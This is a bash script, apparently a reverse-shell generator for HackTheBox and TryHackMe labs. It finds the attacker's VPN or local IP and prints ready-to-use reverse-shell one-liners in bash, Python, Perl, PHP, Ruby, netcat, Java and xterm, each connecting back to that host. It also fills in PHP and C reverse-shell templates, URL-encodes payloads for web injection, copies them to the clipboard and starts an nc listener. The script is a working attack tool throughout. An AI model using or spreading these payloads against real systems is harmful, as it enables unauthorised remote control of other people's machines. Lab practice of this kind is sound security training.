#!/bin/bash

#command to grep the tun0 ip(htb or thm virtual ip)
# function to update the script

#curl -s --max-time 1 -o /dev/null -I -w "%{http_code}" http://10.10.10.10
#200 if connected, 000 is not


self_update(){

update=0

if [ "$update" == "0" ]
	then
		command=$(git pull 2>/dev/null)
		if [ "$command" == "Already up to date." ]
			then
				echo "Up to date"
		
		else
			echo "Update Complete"
		fi
	update=1

fi


}

updated=0
error=$(cat /sys/class/net/tun0/operstate 2>/dev/null)
e=0
interface=0
local=0
thm=0
htb=0



pt=1234
x=0 

PURPLE="35"
BLUE="34"
CYAN="36"
RED="31"

ENDCOLOR="\e[0m"

BOLD="\e[1m"

BOLDPURPLE="\e[1;${PURPLE}m"
BOLDBLUE="\e[1;${BLUE}m"
BOLDRED="\e[1;${RED}m"
BOLDCYAN="\e[1;${CYAN}m"

urlencode() {
    # urlencode <string>

    local length="${#1}"
    for (( i = 0; i < length; i++ )); do
        local c="${1:i:1}"
        case $c in
            [a-zA-Z0-9.~_-]) printf "$c" ;;
            *) printf '%s' "$c" | xxd -p -c1 |
                   while read c; do printf '%%%s' "$c"; done ;;
        esac
    done
}

die() {
	printf '%s\n' "$1" >&2
	exit 1
}

ded() {
	echo "interface $inter not found"
	exit 1
}


assignip(){

#################################
if [ "$interface" == "1" ]
then
	test -e /sys/class/net/$inter/operstate ||  ded
		
	ip4=$(/sbin/ip -o -4 addr list $inter | awk '{print $4}' | cut -d/ -f1)
	# echo $ip4

elif [ "$interface" == "0" ]
then
	newcheck=$(curl -s --max-time 1 -o /dev/null -I -w "%{http_code}" http://10.10.10.10)
	if [ "$newcheck" == "200" ]
	then
		
		echo "THM IP Detected"
		ip4=$(curl http://10.10.10.10/whoami 2>/dev/null) 
		
	
	else
		ip4=$(/sbin/ip -o -4 addr list eth0 | awk '{print $4}' | cut -d/ -f1)
	fi
fi
}



assign() {
	
assignip



bash="bash -i >& /dev/tcp/$ip4/$pt 0>&1"

perl="perl -e 'use Socket;$i=\"$ip4\";$p=$pt;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"

python="python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip4\",$pt));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"

php="php -r '$sock=fsockopen(\"$ip4\",$pt);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"

ruby="ruby -rsocket -e'f=TCPSocket.open(\"$ip4\",$pt).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"

nc="nc -e /bin/sh $ip4 $pt"

java="r = Runtime.getRuntime()
p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/$ip4/$pt;cat <&5 | while read line; do \$line 2>&5 >&5; done\"] as String[])
p.waitFor() "

xterm="xterm -display $ip4:1"




if [ "$rev_shell" == "bash" ]
then
	rev_shell=$bash

elif [ "$rev_shell" == "python" ]
	then
		rev_shell=$python

elif [ "$rev_shell" == "php" ]
	then
		rev_shell=$php

elif [ "$rev_shell" == "nc" ]
	then
		rev_shell=$nc

elif [ "$rev_shell" == "ruby" ]
	then
		rev_shell=$ruby

elif [ "$rev_shell" == "perl" ]
	then
		rev_shell=$perl

elif [ "$rev_shell" == "java" ]
	then
		rev_shell=$Java

elif [ "$rev_shell" == "xterm" ]
	then
		rev_shell=$xterm
		echo -e "To use this shell you need to authorize the target to connect to you using : xhost +targetip \non you machine\n"

elif [ "$rev_shell" == "php-upload" ]	
	then
		rev_shell="php_upload"
		
		cp reverse_shells/php_reverse_shell.php php-shell.php
		sed -i -e "s/IPADDRESS/$ip4/g" php-shell.php
		sed -i -e "s/PORTNUMBER/$pt/g" php-shell.php

elif [ "$rev_shell" == "c" ]
	then
		rev_shell="c_reverse_shell"
		
		echo -e "${BOLDRED}Compile the shell using:${ENDCOLOR}${BOLD}$ gcc c-shell.c -o c-shell${ENDCOLOR}"
		cp reverse_shells/c_reverse_shell.c c-shell.c
		sed -i -e "s/IPADDRESS/$ip4/g" c-shell.c
		sed -i -e "s/PORTNUMBER/$pt/g" c-shell.c


else
	echo "Invalid Format"
	echo -e $options
	exit 1

fi



echo -e "${BOLD}Using IP:${ENDCOLOR} ${BOLDPURPLE}$ip4${ENDCOLOR} \n"
echo -e "${BOLD}Using Port:${ENDCOLOR} ${BOLDBLUE}$pt${ENDCOLOR} \n"
echo -e "${BOLD}Shell:${ENDCOLOR}"
if [ "$rev_shell" == "c_reverse_shell" ]
then
	echo -e "\e[1;38;5;220mCheck your current directory for a \" c-shell.c\" file${ENDCOLOR}"
elif [ "$rev_shell" == "php_upload" ]
	then
		echo -e "\e[1;38;5;220mCheck your current directory for a \" php-shell.php\" file${ENDCOLOR}"
else

echo -e "\e[1;38;5;220m$rev_shell${ENDCOLOR} \n"
command_not_found_handle() { echo "Install xclip for auto copy"; return 127; }
echo -e "$rev_shell" | xclip -selection clipboard
unset command_not_found_handle
fi
}


options=' Available shells \n 1.Bash \n 2.Python \n 3.Php \n 4.Ruby \n 5.Perl \n 6.Java \n 7.nc \n 8.xterm \n 9.php-upload \n 10.c'
help='Usage: ./shells.sh -s [shell type] -[flag] \n -h \t\t\t\t show help \n -s \t\t\t\t select a shell \n -v \t\t\t\t use virtual ip address \n -l \t\t\t\t use local ip address \n -u \t\t\t\t url encode the shell \n -p \t\t\t\t specify a port \n -x \t\t\t\t do not start a listener automatically \n -i \t\t\t\t choose custom interface \n -o \t\t\t\t show options/shells'




if [ "$1" == "" ]
then
	echo "No Options Specified, use -h for help"
fi


while :; do
       case $1 in
           -h|-\?|--help)
               echo -e "$help"    # Display a usage synopsis.
               exit
               ;;
           -o|--options)
				echo -e "$options"
				exit
				;;
           # -l|--local)       # Takes an option argument; ensure it has been specified.
               
           #     local=1
           #     # echo "Using local ip address: $ip4"
               
           #     ;;

           -v|--virtual)
				

               if [ "$error" == "unknown" ]
				then

					ip4=$(/sbin/ip -o -4 addr list tun0 | awk '{print $4}' | cut -d/ -f1)
					# echo "Using virtual ip address: $ip4"
					
				else
					die 'ERROR:You are not connected to a virtual network'

				fi
               
               ;;
            -s|--shell)
				
				if [ "$2" ]
				then
					sh=1
					rev_shell="$2"
					shift
				else
					die 'ERROR: "--shell" requires a non-empty option argument.'
				fi
				;;

           -u|--url-encode)
				url=1
				

			   ;;
		   -p|--port)
				if [ "$2" ]
				then
					pt="$2"
					shift
				else
					echo -e "${RED}Port not specified, using default port 1234${ENDCOLOR}" 
				fi

			   ;;
		   -x)
					x=1

			   ;;
		   -i)
				if [ "$2" ]
				then
				
					interface=1
					inter="$2"
				
			
				shift
			fi
			   ;;
           --)              # End of all options.
               shift
               break
               ;;
           -?*)
               echo -e "${RED}WARN: Unknown option (ignored): $1${ENDCOLOR}"
               ;;
           *)               # Default case: No more options, so break out of the loop.
               break
       esac
   
       shift
   done




	

if [ $sh ]
then
	echo "Checking for updates..."
	self_update
	assign


	if [ $url ]
	then
		echo -e "${BOLD}Url-encoded Shell:${ENDCOLOR}"
		if [ "$rev_shell" == "php_upload" ] || [ "$rev_shell" == "c_reverse_shell" ]
		then
			echo -e "${BOLD}Not Applicable with this shell${ENDCOLOR}"
		else
		echo -e "${BOLDCYAN}"
		urlencode "$rev_shell"
	fi
		echo -e "\n"
			
	fi
	if [ "$x" == "0" ]
	then
		echo "Starting a listener on port: $pt"
		echo "---------------------------------"

		if [ "$rev_shell" == "xterm -display $ip4:1" ]
		then
			Xnest :1
		else
			nc -lnvp $pt
		fi
	fi
fi

